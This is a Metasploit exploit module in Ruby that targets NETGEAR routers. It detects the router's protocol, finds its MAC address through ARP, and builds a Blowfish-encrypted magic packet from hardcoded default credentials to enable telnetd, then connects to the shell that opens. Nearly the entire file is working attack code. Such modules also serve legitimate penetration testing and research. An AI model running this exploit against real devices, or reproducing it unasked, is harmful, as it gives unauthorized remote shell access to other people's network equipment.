# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Udp
  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Capture

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;               => &#039;NETGEAR TelnetEnable&#039;,
      &#039;Description&#039;        => %q{
        This module sends a magic packet to a NETGEAR device to enable telnetd.
      },
      &#039;Author&#039;             => [
        &#039;Paul Gebheim&#039;, # Python PoC (TCP)
        &#039;insanid&#039;,      # Python PoC (UDP)
        &#039;wvu&#039;,          # Metasploit module
      ],
      &#039;References&#039;         => [
        [&#039;URL&#039;, &#039;https://wiki.openwrt.org/toh/netgear/telnet.console&#039;],
        [&#039;URL&#039;, &#039;https://github.com/cyanitol/netgear-telenetenable&#039;],
        [&#039;URL&#039;, &#039;https://github.com/insanid/netgear-telenetenable&#039;]
      ],
      &#039;DisclosureDate&#039;     => &#039;Oct 30 2009&#039;, # Python PoC (TCP)
      &#039;License&#039;            => MSF_LICENSE,
      &#039;Platform&#039;           => &#039;unix&#039;,
      &#039;Arch&#039;               => ARCH_CMD,
      &#039;Privileged&#039;         => true,
      &#039;Payload&#039;            => {
        &#039;Compat&#039;           => {
          &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
          &#039;ConnectionType&#039; => &#039;find&#039;
        }
      },
      &#039;Targets&#039;            => [
        [&#039;Automatic (detect TCP or UDP)&#039;,
          proto:    :auto
        ],
        [&#039;TCP (typically older devices)&#039;,
          proto:    :tcp,
          username: &#039;Gearguy&#039;,
          password: &#039;Geardog&#039;
        ],
        [&#039;UDP (typically newer devices)&#039;,
          proto:    :udp,
          username: &#039;admin&#039;,
          password: &#039;password&#039;
        ]
      ],
      &#039;DefaultTarget&#039;      => 0
    ))

    register_options([
      Opt::RPORT(23),
      OptString.new(&#039;MAC&#039;,      [false, &#039;MAC address of device&#039;]),
      OptString.new(&#039;USERNAME&#039;, [false, &#039;Username on device&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [false, &#039;Password on device&#039;])
    ])
  end

  def check
    # Run through protocol detection
    detect_proto

    # This is a gamble, but it&#039;s the closest we can get
    if @proto == :tcp
      CheckCode::Detected
    else
      CheckCode::Unknown
    end
  end

  def exploit
    # Try to do the exploit unless telnetd is detected
    @do_exploit = true

    @proto = target[:proto]
    detect_proto if @proto == :auto

    # Use supplied or ARP-cached MAC address
    configure_mac if @do_exploit

    # Use supplied or default creds
    configure_creds if @do_exploit

    # Shell it
    exploit_telnetenabled if @do_exploit
    connect_telnetd
  end

  def detect_proto
    begin
      connect

      res = begin
        sock.get_once || &#039;&#039;
      rescue EOFError
        &#039;&#039;
      end

      # telnetenabled returns no data, unlike telnetd
      if res.length == 0
        print_good(&#039;Detected telnetenabled on TCP&#039;)
      else
        print_good(&#039;Detected telnetd on TCP&#039;)
        @do_exploit = false
      end

      @proto = :tcp
    # It&#039;s UDP... and we may not get an ICMP error...
    rescue Rex::ConnectionError
      print_good(&#039;Detected telnetenabled on UDP&#039;)
      @proto = :udp
    ensure
      disconnect
    end
  end

  def configure_mac
    @mac = datastore[&#039;MAC&#039;]

    return if @mac

    print_status(&#039;Attempting to discover MAC address via ARP&#039;)

    begin
      open_pcap
      @mac = lookup_eth(rhost).first
    rescue RuntimeError
      fail_with(Failure::BadConfig, &#039;Superuser access required&#039;)
    ensure
      close_pcap
    end

    if @mac
      print_good("Found MAC address #{@mac}")
    else
      fail_with(Failure::Unknown, &#039;Could not find MAC address&#039;)
    end
  end

  def configure_creds
    @username = datastore[&#039;USERNAME&#039;] || target[:username]
    @password = datastore[&#039;PASSWORD&#039;] || target[:password]

    # Try to use default creds if no creds were found
    unless @username && @password
      tgt = targets.find { |t| t[:proto] == @proto }
      @username = tgt[:username]
      @password = tgt[:password]
    end

    print_good("Using creds #{@username}:#{@password}")
  end

  def exploit_telnetenabled
    print_status(&#039;Generating magic packet&#039;)
    payload = magic_packet(@mac, @username, @password)

    begin
      print_status("Connecting to telnetenabled via #{@proto.upcase}")
      @proto == :tcp ? connect : connect_udp
      print_status(&#039;Sending magic packet&#039;)
      @proto == :tcp ? sock.put(payload) : udp_sock.put(payload)
    rescue Rex::ConnectionError
      fail_with(Failure::Disconnected, &#039;Something happened mid-connection!&#039;)
    ensure
      print_status(&#039;Disconnecting from telnetenabled&#039;)
      @proto == :tcp ? disconnect : disconnect_udp
    end

    # Wait a couple seconds for telnetd to come up
    print_status(&#039;Waiting for telnetd&#039;)
    sleep(2)
  end

  def connect_telnetd
    print_status(&#039;Connecting to telnetd&#039;)
    connect
    handler(sock)
  end

  # NOTE: This is almost a verbatim copy of the Python PoC
  def magic_packet(mac, username, password)
    mac = mac.gsub(/[:-]/, &#039;&#039;).upcase

    if mac.length != 12
      fail_with(Failure::BadConfig, &#039;MAC must be 12 bytes without : or -&#039;)
    end
    just_mac = mac.ljust(0x10, "\x00")

    if username.length > 0x10
      fail_with(Failure::BadConfig, &#039;USERNAME must be <= 16 bytes&#039;)
    end
    just_username = username.ljust(0x10, "\x00")

    if @proto == :tcp
      if password.length > 0x10
        fail_with(Failure::BadConfig, &#039;PASSWORD must be <= 16 bytes&#039;)
      end
      just_password = password.ljust(0x10, "\x00")
    elsif @proto == :udp
      # Thanks to Roberto Frenna for the reserved field analysis
      if password.length > 0x21
        fail_with(Failure::BadConfig, &#039;PASSWORD must be <= 33 bytes&#039;)
      end
      just_password = password.ljust(0x21, "\x00")
    end

    cleartext = (just_mac + just_username + just_password).ljust(0x70, "\x00")
    md5_key = Rex::Text.md5_raw(cleartext)

    payload = byte_swap((md5_key + cleartext).ljust(0x80, "\x00"))

    secret_key = &#039;AMBIT_TELNET_ENABLE+&#039; + password

    byte_swap(blowfish_encrypt(secret_key, payload))
  end

  def blowfish_encrypt(secret_key, payload)
    cipher = OpenSSL::Cipher.new(&#039;bf-ecb&#039;).encrypt

    cipher.padding = 0
    cipher.key_len = secret_key.length
    cipher.key     = secret_key

    cipher.update(payload) + cipher.final
  end

  def byte_swap(data)
    data.unpack(&#039;N*&#039;).pack(&#039;V*&#039;)
  end

end

